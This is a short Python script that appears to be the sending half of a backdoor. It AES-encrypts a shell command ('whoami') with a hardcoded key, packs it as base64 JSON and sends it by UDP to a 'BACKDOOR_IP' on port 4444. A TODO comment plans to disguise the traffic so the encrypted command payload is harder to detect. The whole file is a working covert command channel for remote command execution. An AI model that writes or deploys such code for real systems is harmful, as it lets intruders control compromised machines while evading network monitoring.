from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

import base64
import json
import socket
import time

BACKDOOR_IP = '127.0.0.1'
BACKDOOR_PORT = 4444
SECRET_KEY = b"keep the change ya filthy animal"
MESSAGE = b"whoami"

def encrypt(aes, message):
    cipher_text = aes.encrypt(pad(message, AES.block_size))
    return cipher_text

def create_structured_message(cipher_text, iv):
    structured_message = {}
    structured_message['iv'] = base64.b64encode(iv).decode('utf-8')
    structured_message['cipher_text'] = base64.b64encode(cipher_text).decode('utf-8')
    jsondata = json.dumps(structured_message)

    # TODO: obscure the payload
    # the message should be cryptographically secure, but we might
    # want to obscure the data a bit just to require more effort to
    # figure out that we are sending an encypted payload
    return jsondata.encode('utf-8')

def create_cipher_message(aes, message):
    cipher_text = encrypt(aes, message)
    structured_message = create_structured_message(cipher_text, aes.iv)
    return structured_message

def main():
    # Create a new AES cipher using the key
    aes = AES.new(SECRET_KEY, AES.MODE_CBC)

    # create a ciphertext and digest, with enough information to be
    # decrypted
    structured_message = create_cipher_message(aes, MESSAGE)

    # Open a UDP socket to send the message/payload
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    server_tuple = (BACKDOOR_IP, BACKDOOR_PORT)

    #sock.sendto(b"Hello", server_tuple)
    sock.sendto(structured_message, server_tuple)

if __name__ == "__main__":
    main()
